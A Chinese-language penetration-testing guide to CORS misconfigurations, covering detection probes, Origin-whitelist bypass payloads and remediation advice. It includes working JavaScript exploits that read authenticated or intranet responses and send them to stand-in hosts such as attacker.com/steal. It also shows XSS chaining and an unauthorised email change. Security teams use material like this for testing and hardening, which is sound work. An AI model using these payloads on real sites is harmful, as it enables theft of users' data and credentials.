# CORS 配置错误利用方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 CORS（跨域资源共享）配置错误检测与利用流程，帮助发现因 CORS 配置不当导致的未授权数据访问漏洞。

## 1.2 适用范围

本文档适用于所有提供 API 接口或需要跨域访问的 Web 应用，特别是：
- 前后端分离的单页应用（SPA）
- 提供 RESTful/GraphQL API 的服务
- 支持多域名访问的系统
- 微服务架构中的服务间通信

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

CORS 配置错误是指服务器返回的 CORS 响应头过于宽松，允许不受信任的源访问 API 资源，导致攻击者可以从恶意网站发起跨域请求获取敏感数据。

**本质问题**：
- Access-Control-Allow-Origin 配置过于宽松
- 允许凭证的跨域请求（Access-Control-Allow-Credentials: true）
- 缺少来源验证或验证逻辑存在缺陷
- 动态反射 Origin 头 without 白名单校验

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-942 | 允许不受信任域的宽松跨域策略 |
| CWE-284 | 不当访问控制 |
| CWE-200 | 敏感信息暴露 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| API 接口 | REST API | 允许任意源访问 |
| 单页应用 | 前后端分离 | CORS 配置宽松 |
| 移动应用 | 后端 API | 未限制来源 |
| 微服务 | 服务间通信 | CORS 未正确配置 |
| 用户数据接口 | /api/user/profile | 可窃取用户敏感信息 |
| 管理 API | /api/admin/* | 可执行管理操作 |

## 2.3 漏洞发现方法

### 2.3.1 CORS 头检测

```bash
# 检查 CORS 响应头
curl -H "Origin: https://evil.com" \
     -v https://target.com/api/data

# 检查响应头：
# Access-Control-Allow-Origin: https://evil.com  (危险)
# Access-Control-Allow-Origin: *                 (中等)
# Access-Control-Allow-Credentials: true         (危险组合)
```

### 2.3.2 动态来源检测

```bash
# 测试不同来源
curl -H "Origin: https://evil.com" ...
curl -H "Origin: https://attacker.com" ...
curl -H "Origin: null" ...

# 如果服务器反射来源，则存在漏洞
```

### 2.3.3 凭证测试

```bash
# 测试是否允许凭证
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=xxx" \
     -v https://target.com/api/data

# 如果返回 Access-Control-Allow-Credentials: true
# 则可以窃取带 Cookie 的请求响应
```

## 2.4 漏洞利用方法

### 2.4.1 数据窃取

```html
<!-- 恶意网站上的攻击代码 -->
<script>
fetch('https://target.com/api/user/profile', {
    method: 'GET',
    credentials: 'include',  // 包含 Cookie
    mode: 'cors'
}).then(response => response.json())
  .then(data => {
    // 发送到攻击者服务器
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
  });
</script>
```

### 2.4.2 未授权操作

```html
<!-- 执行未授权操作 -->
<script>
fetch('https://target.com/api/user/update', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        email: 'attacker@example.com'
    })
});
</script>
```

### 2.4.3 组合 XSS 攻击

```html
<!-- CORS + XSS 组合攻击 -->
<script>
// 1. 利用 CORS 获取敏感数据
// 2. 利用 XSS 执行恶意代码
// 3. 窃取数据并发送
</script>
```

## 2.5 高级漏洞利用技术

### 2.5.1 服务器端动态反射 Origin 头

**原理**：服务器将客户端请求中的 `Origin` 头直接反射到 `Access-Control-Allow-Origin` 响应头中，导致任意域名可访问资源。

**利用步骤**：

1. 发送带有恶意 Origin 头的请求：
```http
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

2. 检查响应是否包含：
```http
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

3. 创建恶意页面窃取数据：
```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;
req.send();

function reqListener() {
    location = '//malicious-website.com/log?key=' + this.responseText;
};
```

### 2.5.2 Origin 头白名单解析错误

**原理**：服务器使用白名单校验 Origin，但实现存在缺陷（如前缀/后缀匹配、正则表达式错误）。

**常见错误模式**：

| 白名单规则 | 绕过方法 |
|-----------|---------|
| 后缀匹配 `normal-website.com` | 注册 `hackersnormal-website.com` |
| 前缀匹配 `normal-website.com` | 使用 `normal-website.com.evil-user.net` |
| 正则表达式不严谨 | 构造特殊字符绕过 |

**测试步骤**：
1. 识别白名单模式（测试多个子域名）
2. 尝试注册相似域名进行绕过
3. 测试特殊字符和编码绕过

**利用示例**：
```bash
# 测试前缀匹配绕过
Origin: https://normal-website.com.evil.com

# 测试后缀匹配绕过
Origin: https://evil-normal-website.com

# 测试特殊字符绕过
Origin: https://normal-website.com@evil.com
```

### 2.5.3 Null Origin 白名单

**原理**：服务器允许 `Origin: null`，攻击者可利用沙箱环境生成 null Origin 请求。

**利用场景**：
- 跨域重定向
- 序列化数据请求
- `file:` 协议请求
- 沙箱跨域请求

**利用代码**：
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
    location='https://malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

### 2.5.4 通过 CORS 信任关系利用 XSS

**原理**：目标网站信任的子域名存在 XSS 漏洞，攻击者可利用 XSS 注入 CORS 请求窃取数据。

**攻击流程**：
1. 发现目标网站信任的子域名（如 `subdomain.vulnerable-website.com`）
2. 在子域名上寻找 XSS 漏洞
3. 通过 XSS 注入 CORS 请求代码获取敏感数据

**利用示例**：
```
https://subdomain.vulnerable-website.com/?xss=<script>
var req = new XMLHttpRequest();
req.open('get','https://vulnerable-website.com/api/requestApiKey',true);
req.withCredentials = true;
req.onload = function() {
    fetch('https://attacker.com/steal?data='+this.responseText);
};
req.send();
</script>
```

### 2.5.5 利用 CORS 配置破坏 TLS

**原理**：HTTPS 网站信任 HTTP 子域名，攻击者可通过中间人攻击降级通信。

**攻击步骤**：
1. 受害者发起任意 HTTP 请求
2. 攻击者注入重定向到 `http://trusted-subdomain.vulnerable-website.com`
3. 攻击者拦截 HTTP 请求，返回伪造的 CORS 请求页面
4. 受害者浏览器发起 CORS 请求（Origin 为受信任的 HTTP 子域名）
5. 服务器允许请求并返回敏感数据
6. 攻击者窃取数据

### 2.5.6 内网 CORS 无凭证攻击

**原理**：即使没有 `Access-Control-Allow-Credentials: true`，攻击者仍可通过 `Access-Control-Allow-Origin: *` 访问内网资源。

**攻击场景**：
- 内网网站安全标准较低
- 攻击者无法直接访问内网
- 利用受害者浏览器作为代理

**利用代码**：
```javascript
var req = new XMLHttpRequest();
req.open('get', 'http://intranet.normal-website.com/reader?url=doc1.pdf', true);
req.onload = function() {
    fetch('https://attacker.com/steal?data=' + this.responseText);
};
req.send();
```

## 2.6 漏洞利用绕过方法

### 2.6.1 来源验证绕过

```bash
# 测试 Origin 头覆盖
Origin: https://target.com.evil.com
Origin: https://evil.com/target.com
Origin: https://target.com@evil.com
```

### 2.6.2 空来源测试

```bash
# 某些配置允许 null 来源
Origin: null

# 通过 sandbox iframe 产生 null 来源
<iframe sandbox="allow-scripts" src="...">
```

---

# 第三部分：附录

## 3.1 渗透测试步骤

### 阶段 1：信息收集
1. 识别目标网站的 CORS 策略
2. 检查 `Access-Control-Allow-Origin` 响应头
3. 检查 `Access-Control-Allow-Credentials` 响应头
4. 检查 `Access-Control-Allow-Methods` 和 `Access-Control-Allow-Headers`
5. 测试预检请求（OPTIONS）

### 阶段 2：漏洞探测
1. **测试 Origin 反射**：
   - 发送随机 Origin 头，检查是否被反射
   - 测试多个不同域名

2. **测试白名单绕过**：
   - 尝试相似域名（前缀/后缀攻击）
   - 测试特殊字符和编码
   - 测试子域名枚举

3. **测试 Null Origin**：
   - 发送 `Origin: null` 请求
   - 检查是否允许访问

4. **测试通配符配置**：
   - 检查 `Access-Control-Allow-Origin: *`
   - 结合内网资源测试

### 阶段 3：漏洞验证
1. 创建 PoC 页面验证跨域读取
2. 验证敏感数据是否可被窃取
3. 验证是否需要用户交互
4. 记录完整的请求/响应流程

### 阶段 4：影响评估
1. 评估可访问的敏感数据范围
2. 评估是否需要认证凭证
3. 评估潜在的业务影响
4. 提供修复建议

## 3.2 CORS 测试检查清单

```
□ 检查 Access-Control-Allow-Origin
□ 测试来源反射
□ 测试凭证允许
□ 测试 null 来源
□ 测试通配符配置
□ 测试预检请求缓存
□ 测试白名单绕过（前缀/后缀）
□ 测试子域名信任关系
□ 测试内网资源访问
```

## 3.3 常用 Payload 速查表

| 测试类型 | Payload | 说明 |
|---------|--------|------|
| 任意 Origin | `Origin: https://evil.com` | 测试是否反射任意来源 |
| Null Origin | `Origin: null` | 测试是否允许空来源 |
| 前缀绕过 | `Origin: https://evil-target.com` | 测试前缀匹配绕过 |
| 后缀绕过 | `Origin: https://target.com.evil.com` | 测试后缀匹配绕过 |
| 特殊字符 | `Origin: https://target.com@evil.com` | 测试特殊字符绕过 |
| 协议绕过 | `Origin: http://target.com` | 测试 HTTPS 站点的 HTTP 信任 |

## 3.4 修复建议

| 风险 | 防御措施 |
|-----|---------|
| 动态反射 Origin | 使用静态白名单，禁止动态反射 |
| 白名单绕过 | 使用精确匹配，避免前缀/后缀匹配 |
| Null Origin | 禁止 `Access-Control-Allow-Origin: null` |
| 通配符配置 | 内网禁止使用 `*` 通配符 |
| HTTP 子域名 | 所有受信任子域名必须使用 HTTPS |
| 敏感数据保护 | 结合服务端认证和会话管理 |

## 3.5 高级攻击场景

### 3.5.1 内网资源访问攻击

**场景**：攻击者无法直接访问内网，但可通过受害者浏览器访问

**攻击代码**：
```javascript
// 从外网发起对内网资源的 CORS 请求
var req = new XMLHttpRequest();
req.open('get', 'http://intranet.internal-company.com/reader?url=doc1.pdf', true);
req.onload = function() {
    fetch('https://attacker.com/steal?data=' + this.responseText);
};
req.send();
```

**利用条件**：
- 内网应用使用 `Access-Control-Allow-Origin: *`
- 内网应用信任浏览器请求
- 受害者同时访问外网和内网

### 3.5.2 组合 XSS 攻击链

**场景**：CORS + XSS 组合利用

**攻击流程**：
```
1. 发现目标网站信任的子域名存在 XSS
2. 通过 XSS 注入 CORS 请求代码
3. 窃取主站敏感数据（如 API 密钥）
4. 发送数据到攻击者服务器
```

**攻击代码**：
```html
<script>
// 在受信任子域名的 XSS 注入点
var req = new XMLHttpRequest();
req.open('get', 'https://main-site.com/api/requestApiKey', true);
req.withCredentials = true;
req.onload = function() {
    fetch('https://attacker.com/steal?data=' + this.responseText);
};
req.send();
</script>
```

### 3.5.3 TLS 降级攻击

**场景**：HTTPS 网站信任 HTTP 子域名

**攻击流程**：
```
1. 受害者发起任意 HTTP 请求
2. 攻击者（MITM）注入重定向到 http://trusted-subdomain.target.com
3. 攻击者拦截 HTTP 请求，返回伪造的 CORS 请求页面
4. 浏览器发起 CORS 请求，Origin 为受信任的 HTTP 子域名
5. 服务器允许请求，返回敏感数据
6. 攻击者窃取数据
```

**防御**：所有受信任子域名必须使用 HTTPS，HSTS 预加载

---

**参考资源**：
- [OWASP CORS Security](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - CORS](https://portswigger.net/web-security/cors)
- [OWASP Testing Guide - Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE-942: Overly Permissive Cross-Domain Policy](https://cwe.mitre.org/data/definitions/942.html)
